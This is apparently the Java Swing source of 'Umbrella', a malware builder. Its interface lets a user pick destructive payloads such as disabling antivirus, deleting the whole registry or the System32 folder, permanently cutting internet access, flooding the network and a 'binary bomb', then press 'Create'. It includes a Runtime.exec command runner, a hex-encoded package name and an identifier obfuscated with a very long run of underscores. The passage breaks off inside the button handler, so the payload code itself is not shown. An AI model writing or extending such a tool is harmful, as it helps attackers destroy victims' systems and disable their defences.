package __View__;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.nio.file.Files;
import java.nio.file.Path;
import _68747470733a2f2f6769746875622e636f6d2f496e666563746564436c6f776e._InfectedClown_1;
import java.awt.Desktop;
import java.net.URI;
import JAVAC.*;
import java.net.URISyntaxException;
import javax.swing.ImageIcon;
public class __Class__1 extends javax.swing.JFrame {
    public static int R = 5;
    public static int P = 0;
    public static int key = 0;
    public static String xx2 = __Class__2.xx1;
    private void exec(String[] Cmd){
    
        try {
            String commandArray[] = Cmd;
            Process process = Runtime.getRuntime().exec(commandArray);
        } catch (IOException ex) {
            Logger.getLogger(__Class__1.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public __Class__1() {

    initComponents();
        ImageIcon img = new ImageIcon(getClass().getResource( "/__Asset__/InfectedClown.png"));
    this.setIconImage(img.getImage());
         Toolkit tk = this.getToolkit();
    Dimension dim = tk.getScreenSize();
    this.setLocation (
            (int) dim.getWidth() / 2 - this.getWidth() /2, 
            (int) dim.getHeight() / 2 - this.getHeight() / 2);
    }

    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        GP = new javax.swing.ButtonGroup();
        PopUp = new javax.swing.JPopupMenu();
        i_1 = new javax.swing.JMenuItem();
        i_8 = new javax.swing.JMenuItem();
        i_9 = new javax.swing.JMenuItem();
        i_10 = new javax.swing.JMenuItem();
        i_14 = new javax.swing.JMenuItem();
        i_13 = new javax.swing.JMenuItem();
        i_12 = new javax.swing.JMenuItem();
        i_11 = new javax.swing.JMenuItem();
        jLabel2 = new javax.swing.JLabel();
        jPanel1 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        r1 = new javax.swing.JRadioButton();
        r2 = new javax.swing.JRadioButton();
        r3 = new javax.swing.JRadioButton();
        r4 = new javax.swing.JRadioButton();
        r8 = new javax.swing.JRadioButton();
        r5 = new javax.swing.JRadioButton();
        r6 = new javax.swing.JRadioButton();
        r7 = new javax.swing.JRadioButton();
        r12 = new javax.swing.JRadioButton();
        r16 = new javax.swing.JRadioButton();
        r13 = new javax.swing.JRadioButton();
        r14 = new javax.swing.JRadioButton();
        r15 = new javax.swing.JRadioButton();
        r9 = new javax.swing.JRadioButton();
        r10 = new javax.swing.JRadioButton();
        r11 = new javax.swing.JRadioButton();
        jPanel3 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        jPanel4 = new javax.swing.JPanel();
        MC = new javax.swing.JButton();
        Ico = new javax.swing.JButton();
        Abut = new javax.swing.JButton();
        Icon_L = new javax.swing.JLabel();
        jSeparator1 = new javax.swing.JSeparator();
        Op = new javax.swing.JLabel();
        jSeparator2 = new javax.swing.JSeparator();
        ______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ = new javax.swing.JLabel();

        PopUp.setBorderPainted(false);
        PopUp.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        PopUp.setDoubleBuffered(true);

        i_1.setBackground(new java.awt.Color(0, 0, 0));
        i_1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/1-5.png"))); // NOI18N
        i_1.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_1ActionPerformed(evt);
            }
        });
        PopUp.add(i_1);

        i_8.setBackground(new java.awt.Color(0, 0, 0));
        i_8.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/145-3.png"))); // NOI18N
        i_8.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_8.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_8ActionPerformed(evt);
            }
        });
        PopUp.add(i_8);

        i_9.setBackground(new java.awt.Color(0, 0, 0));
        i_9.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/156-7.png"))); // NOI18N
        i_9.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_9.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_9ActionPerformed(evt);
            }
        });
        PopUp.add(i_9);

        i_10.setBackground(new java.awt.Color(0, 0, 0));
        i_10.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/154-8.png"))); // NOI18N
        i_10.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_10.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_10ActionPerformed(evt);
            }
        });
        PopUp.add(i_10);

        i_14.setBackground(new java.awt.Color(0, 0, 0));
        i_14.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/55-46.png"))); // NOI18N
        i_14.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_14.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_14ActionPerformed(evt);
            }
        });
        PopUp.add(i_14);

        i_13.setBackground(new java.awt.Color(0, 0, 0));
        i_13.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/145-2.png"))); // NOI18N
        i_13.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_13.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_13ActionPerformed(evt);
            }
        });
        PopUp.add(i_13);

        i_12.setBackground(new java.awt.Color(0, 0, 0));
        i_12.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/157-7.png"))); // NOI18N
        i_12.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_12.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_12ActionPerformed(evt);
            }
        });
        PopUp.add(i_12);

        i_11.setBackground(new java.awt.Color(0, 0, 0));
        i_11.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/148-15.png"))); // NOI18N
        i_11.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        i_11.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                i_11ActionPerformed(evt);
            }
        });
        PopUp.add(i_11);

        jLabel2.setText("jLabel2");

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Umbrella");
        setResizable(false);

        jPanel1.setBackground(new java.awt.Color(0, 0, 0));
        jPanel1.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 51, 204)));

        jPanel2.setBackground(new java.awt.Color(0, 0, 0));
        jPanel2.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));

        r1.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r1);
        r1.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r1.setForeground(new java.awt.Color(0, 102, 204));
        r1.setSelected(true);
        r1.setText("Disable the Antivirus");
        r1.setActionCommand("");
        r1.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r1.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r1.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r2.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r2);
        r2.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r2.setForeground(new java.awt.Color(0, 102, 204));
        r2.setText("Disable Internet Permanently");
        r2.setActionCommand("");
        r2.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r2.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r2.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r3.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r3);
        r3.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r3.setForeground(new java.awt.Color(0, 102, 204));
        r3.setText("Delete Entire Registry ");
        r3.setActionCommand("");
        r3.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r3.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r3.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r4.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r4);
        r4.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r4.setForeground(new java.awt.Color(0, 102, 204));
        r4.setText("Application bomber ");
        r4.setActionCommand("");
        r4.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r4.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r4.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r8.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r8);
        r8.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r8.setForeground(new java.awt.Color(0, 102, 204));
        r8.setText("Flood Internet");
        r8.setActionCommand("");
        r8.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r8.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r8.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r5.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r5);
        r5.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r5.setForeground(new java.awt.Color(0, 102, 204));
        r5.setText("Endless Notepads");
        r5.setActionCommand("");
        r5.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r5.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r5.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r6.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r6);
        r6.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r6.setForeground(new java.awt.Color(0, 102, 204));
        r6.setText("User Account Bloatware ");
        r6.setActionCommand("");
        r6.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r6.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r6.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r7.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r7);
        r7.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r7.setForeground(new java.awt.Color(0, 102, 204));
        r7.setText("Delete Key Registry Files");
        r7.setActionCommand("");
        r7.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r7.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r7.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r12.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r12);
        r12.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r12.setForeground(new java.awt.Color(0, 102, 204));
        r12.setText("Stop current internet access ");
        r12.setActionCommand("");
        r12.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r12.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r12.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r16.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r16);
        r16.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r16.setForeground(new java.awt.Color(0, 102, 204));
        r16.setText("Endless Backspace ");
        r16.setActionCommand("");
        r16.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r16.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r16.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r13.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r13);
        r13.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r13.setForeground(new java.awt.Color(0, 102, 204));
        r13.setText("Binary Bomb");
        r13.setActionCommand("");
        r13.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r13.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r13.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r14.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r14);
        r14.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r14.setForeground(new java.awt.Color(0, 102, 204));
        r14.setText("Disable Caps Lock");
        r14.setActionCommand("");
        r14.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r14.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r14.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r15.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r15);
        r15.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r15.setForeground(new java.awt.Color(0, 102, 204));
        r15.setText("Turns off when turned on");
        r15.setActionCommand("");
        r15.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r15.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r15.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r9.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r9);
        r9.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r9.setForeground(new java.awt.Color(0, 102, 204));
        r9.setText("Delete System 32 Folder ");
        r9.setActionCommand("");
        r9.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r9.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r9.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r10.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r10);
        r10.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r10.setForeground(new java.awt.Color(0, 102, 204));
        r10.setText("Disgust and shut down ");
        r10.setActionCommand("");
        r10.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r10.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r10.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        r11.setBackground(new java.awt.Color(0, 0, 0));
        GP.add(r11);
        r11.setFont(new java.awt.Font("Segoe UI", 1, 10)); // NOI18N
        r11.setForeground(new java.awt.Color(0, 102, 204));
        r11.setText("System meltdown");
        r11.setActionCommand("");
        r11.setBorder(new javax.swing.border.LineBorder(new java.awt.Color(0, 102, 204), 1, true));
        r11.setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        r11.setHorizontalAlignment(javax.swing.SwingConstants.LEFT);

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(r1)
                    .addComponent(r2)
                    .addComponent(r3)
                    .addComponent(r4)
                    .addComponent(r5)
                    .addComponent(r6)
                    .addComponent(r7)
                    .addComponent(r8))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(r15)
                    .addComponent(r9)
                    .addComponent(r10)
                    .addComponent(r11)
                    .addComponent(r12)
                    .addComponent(r13)
                    .addComponent(r14)
                    .addComponent(r16))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(r1)
                            .addComponent(r9))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r2)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r3)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r4)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r5)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r6)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r7)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r8))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(24, 24, 24)
                        .addComponent(r10)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r11)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r12)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r13)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r14)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r15)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(r16)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel3.setBackground(new java.awt.Color(0, 0, 0));
        jPanel3.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));
        jPanel3.setPreferredSize(new java.awt.Dimension(150, 150));

        jLabel1.setBackground(new java.awt.Color(0, 0, 0));
        jLabel1.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/InfectedClown.png"))); // NOI18N

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jLabel1, javax.swing.GroupLayout.DEFAULT_SIZE, 172, Short.MAX_VALUE)
        );

        jPanel4.setBackground(new java.awt.Color(0, 0, 0));
        jPanel4.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 102, 204)));

        MC.setBackground(new java.awt.Color(0, 0, 0));
        MC.setFont(new java.awt.Font("Yu Gothic UI Semibold", 0, 12)); // NOI18N
        MC.setForeground(new java.awt.Color(0, 102, 204));
        MC.setText("Create");
        MC.setBorder(javax.swing.BorderFactory.createMatteBorder(1, 1, 1, 1, new java.awt.Color(0, 102, 204)));
        MC.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                MCActionPerformed(evt);
            }
        });

        Ico.setBackground(new java.awt.Color(0, 0, 0));
        Ico.setForeground(new java.awt.Color(0, 102, 204));
        Ico.setText("Icon");
        Ico.setBorder(javax.swing.BorderFactory.createMatteBorder(1, 1, 1, 1, new java.awt.Color(0, 102, 204)));
        Ico.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                IcoActionPerformed(evt);
            }
        });

        Abut.setBackground(new java.awt.Color(0, 0, 0));
        Abut.setForeground(new java.awt.Color(0, 102, 204));
        Abut.setText("About");
        Abut.setBorder(javax.swing.BorderFactory.createMatteBorder(1, 1, 1, 1, new java.awt.Color(0, 102, 204)));
        Abut.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                AbutActionPerformed(evt);
            }
        });

        Icon_L.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/148-15.png"))); // NOI18N
        Icon_L.setText("r");
        Icon_L.setMaximumSize(new java.awt.Dimension(48, 48));
        Icon_L.setPreferredSize(new java.awt.Dimension(32, 32));

        jSeparator1.setBackground(new java.awt.Color(0, 0, 0));
        jSeparator1.setForeground(new java.awt.Color(0, 102, 204));

        Op.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/Es.gif"))); // NOI18N
        Op.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);

        jSeparator2.setBackground(new java.awt.Color(0, 0, 0));
        jSeparator2.setForeground(new java.awt.Color(0, 102, 204));

        ______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________.setIcon(new javax.swing.ImageIcon(getClass().getResource("/__Asset__/__E.png"))); // NOI18N

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(Op, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jSeparator1)
                    .addComponent(MC, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addComponent(Ico, javax.swing.GroupLayout.PREFERRED_SIZE, 86, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(Abut, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addComponent(Icon_L, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________, javax.swing.GroupLayout.PREFERRED_SIZE, 119, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(0, 0, Short.MAX_VALUE)))
                .addContainerGap())
            .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(jPanel4Layout.createSequentialGroup()
                    .addContainerGap()
                    .addComponent(jSeparator2)
                    .addContainerGap()))
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(Icon_L, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE))
                .addGap(39, 39, 39)
                .addComponent(jSeparator1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(Op, javax.swing.GroupLayout.DEFAULT_SIZE, 25, Short.MAX_VALUE)
                .addGap(14, 14, 14)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(Abut)
                    .addComponent(Ico, javax.swing.GroupLayout.PREFERRED_SIZE, 18, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(MC)
                .addContainerGap())
            .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                    .addContainerGap(113, Short.MAX_VALUE)
                    .addComponent(jSeparator2, javax.swing.GroupLayout.PREFERRED_SIZE, 15, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGap(44, 44, 44)))
        );

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel1Layout.createSequentialGroup()
                        .addComponent(jPanel3, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                .addContainerGap())
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, 174, Short.MAX_VALUE)
                    .addComponent(jPanel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void MCActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_MCActionPerformed
        if(r1.isSelected()){P = 0;}
        else if(r2.isSelected()){P = 1;}
        else if(r3.isSelected()){P = 2;}  
        else if(r4.isSelected()){P = 3;}  
        else if(r5.isSelected()){P = 4;}  
        else if(r6.isSelected()){P = 5;}  
        else if(r7.isSelected()){P = 6;}  
